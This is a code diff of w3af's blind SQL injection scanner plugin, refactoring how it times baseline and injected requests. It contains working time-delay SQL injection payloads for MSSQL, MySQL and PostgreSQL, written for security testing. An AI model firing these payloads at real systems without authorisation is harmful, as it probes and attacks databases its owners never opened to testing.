@@ -19,12 +19,13 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
-
-from core.controllers.basePlugin.basePlugin import basePlugin
-from core.data.fuzzer.fuzzer import createMutants
+import core.controllers.outputManager as om
 import core.data.constants.dbms as dbms
 import core.data.constants.severity as severity
 import core.data.kb.vuln as vuln
+
+from core.controllers.basePlugin.basePlugin import basePlugin
+from core.data.fuzzer.fuzzer import createMutants
 
 
 class blind_sqli_time_delay(basePlugin):
@@ -40,10 +41,7 @@ class blind_sqli_time_delay(basePlugin):
         basePlugin.__init__(self)
         
         # The wait time of the first test I'm going to perform
-        self._wait_time = 5
-        
-        # The original delay between request and response
-        _original_wait_time = 0
+        self._wait_time = 4
         
     def is_injectable( self, freq, parameter ):
         '''
@@ -54,14 +52,17 @@ class blind_sqli_time_delay(basePlugin):
         
         @return: A vulnerability object or None if nothing is found
         '''
+        #
+        #    Setup
+        #
+        
         # First save the original wait time
-        _original_wait_time = self._sendMutant( freq, analyze=False ).getWaitTime()
+        original_wait_time = self._get_original_time(freq, rep=3)
         
         # Create the mutants
-        parameter_to_test = [ parameter, ]
         statement_list = self._get_statements()
         sql_commands_only = [ i.sql_command for i in statement_list ]
-        mutants = createMutants( freq , sql_commands_only, fuzzableParamList=parameter_to_test )
+        mutants = createMutants( freq , sql_commands_only, fuzzableParamList=[parameter, ] )
         
         # And now I assign the statement to the mutant
         for statement in statement_list:
@@ -70,24 +71,23 @@ class blind_sqli_time_delay(basePlugin):
                     mutant.statement = statement.sql_command
                     mutant.dbms = statement.dbms
         
-        # Perform the test
+        #
+        #    Run the tests
+        #
         for mutant in mutants:
             
-            # Send
-            response = self._sendMutant( mutant, analyze=False )
-            
-            # Compare times
-            if response.getWaitTime() > (_original_wait_time + self._wait_time-2):
+            response = self._sendMutant( mutant, analyze=False, useCache=False )
+            if response.getWaitTime() > (original_wait_time + self._wait_time - 0.5):
                 
-                # Resend the same request to verify that this wasn't because of network delay
-                # or some other rare thing
-                _original_wait_time = self._sendMutant( freq, analyze=False ).getWaitTime()
-                response = self._sendMutant( mutant, analyze=False )
-                
-                # Compare times (once again)
-                if response.getWaitTime() > (_original_wait_time + self._wait_time-2):
+                # Re-send the same request to verify that this wasn't because of
+                # network delay or some other rare thing
+                original_wait_time = self._get_original_time(freq, rep=3)
+                response = self._sendMutant( mutant, analyze=False, useCache=False )
+
+                if response.getWaitTime() > (original_wait_time + self._wait_time - 0.5):
                     
-                    # Now I can be sure that I found a vuln, I control the time of the response.
+                    # Now I can be sure that I found a vuln, w3 control the response
+                    # time with the delay
                     v = vuln.vuln( mutant )
                     v.setName( 'Blind SQL injection - ' + mutant.dbms )
                     v.setSeverity(severity.HIGH)
@@ -95,9 +95,21 @@ class blind_sqli_time_delay(basePlugin):
                     v.setDc( mutant.getDc() )
                     v.setId( response.id )
                     v.setURI( response.getURI() )
+                    
+                    om.out.debug( v.getDesc() )
+
                     return v
                 
         return None
+    
+    def _get_original_time(self, freq, rep=3):
+        original_wait_times = []
+        
+        for _ in xrange(rep):
+            time = self._sendMutant( freq, analyze=False, useCache=False ).getWaitTime()
+            original_wait_times.append(time)
+        
+        return float(sum(original_wait_times)) / len(original_wait_times)
     
     def _get_statements( self ):
         '''
@@ -106,35 +118,45 @@ class blind_sqli_time_delay(basePlugin):
         '''
         res = []
         
-        # MSSQL
-        res.append( statement("1;waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
-        res.append( statement("1);waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
-        res.append( statement("1));waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
-        res.append( statement("1';waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
-        res.append( statement("1');waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
-        res.append( statement("1'));waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
+        delay = self._wait_time
         
-        # MySQL
-        # =====
-        # MySQL doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
+        # MSSQL
+        res.append( statement("1;waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+        res.append( statement("1);waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+        res.append( statement("1));waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+        res.append( statement("1';waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+        res.append( statement("1');waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+        res.append( statement("1'));waitfor delay '0:0:%s'--" % delay, dbms.MSSQL) )
+
+        # MySQL 5
+        #
+        # Thank you guys for adding sleep(seconds) !
+        #
+        res.append( statement("1 or SLEEP(%s)" % delay, dbms.MYSQL) )
+        res.append( statement("1' or SLEEP(%s) or '1'='1" % delay, dbms.MYSQL) )
+        res.append( statement('1" or SLEEP(%s) or "1"="1' % delay, dbms.MYSQL) )
+        
+        # MySQL 4
+        # 
+        # MySQL 4 doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
         # but the benchmarking will delay the response a different amount of time in each computer
         # which sucks because I use the time delay to check!
         #
         # In my test environment 3500000 delays 10 seconds
-        # This is why I selected 2500000 which is guaranteeded to (at least) delay 8
+        # This is why I selected 2500000 which is guaranteed to (at least) delay 8
         # seconds; and I only check the delay like this:
-        #                 response.getWaitTime() > (_original_wait_time + self._wait_time-2):
+        #                 response.getWaitTime() > (original_wait_time + self._wait_time-2):
         #
         # With a small wait time of 5 seconds, this should work without problems...
         # and without hitting the xUrllib timeout !
         res.append( statement("1 or BENCHMARK(2500000,MD5(1))", dbms.MYSQL) )
         res.append( statement("1' or BENCHMARK(2500000,MD5(1)) or '1'='1", dbms.MYSQL) )
         res.append( statement('1" or BENCHMARK(2500000,MD5(1)) or "1"="1', dbms.MYSQL) )
-        
+              
         # PostgreSQL
-        res.append( statement("1 or pg_sleep("+ str(self._wait_time) +")", dbms.POSTGRE) )
-        res.append( statement("1' or pg_sleep("+ str(self._wait_time) +") or '1'='1", dbms.POSTGRE) )
-        res.append( statement('1" or pg_sleep('+ str(self._wait_time) +') or "1"="1', dbms.POSTGRE) )
+        res.append( statement("1 or pg_sleep(%s)" % delay, dbms.POSTGRE) )
+        res.append( statement("1' or pg_sleep(%s) or '1'='1" % delay, dbms.POSTGRE) )
+        res.append( statement('1" or pg_sleep(%s) or "1"="1' % delay, dbms.POSTGRE) )
         
         # TODO: Add Oracle support
         # TODO: Add XXXXX support
